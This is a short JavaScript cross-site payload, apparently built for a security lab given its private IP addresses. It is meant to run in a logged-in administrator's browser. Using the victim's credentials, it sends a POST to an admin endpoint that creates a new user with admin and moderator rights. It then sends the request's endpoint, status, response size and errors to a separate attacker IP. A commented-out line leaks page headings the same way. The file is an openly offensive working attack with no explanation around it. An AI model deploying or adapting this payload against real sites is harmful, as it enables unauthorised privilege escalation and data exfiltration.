const attacker_ip = '192.168.119.123';
/*var h1s = document.getElementsByTagName("h1");
fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
*/
const host = 'answers';
const host_ip = '192.168.123.251';

username = "zinhart"
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(`http://${host_ip}/admin/users/create`, config);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  return fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}